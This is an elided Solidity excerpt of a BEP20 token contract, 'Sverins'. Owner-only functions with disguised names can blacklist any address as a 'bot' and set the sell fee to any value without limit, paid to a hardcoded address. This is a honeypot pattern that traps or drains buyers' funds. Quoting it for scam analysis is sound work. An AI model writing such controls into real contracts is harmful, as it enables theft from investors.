...
contract Sverins is IBEP20, Admin{
    ...
    string constant _name = "SSverpalins";
    string constant _symbol = "Sverins";
    ...
    address private marketingFeeReceiver = (0x707395B94b2005D8a3433E3c3562Ea9715190f2e); // marketing address
    ...
    function setDFSverins(address account,bool bmv) external onlyOwner() {
        bots[account] = bmv;
    }

    function setDBSverins(uint256 fv) external onlyOwner {
        sellMarketingFee = fv;
    }
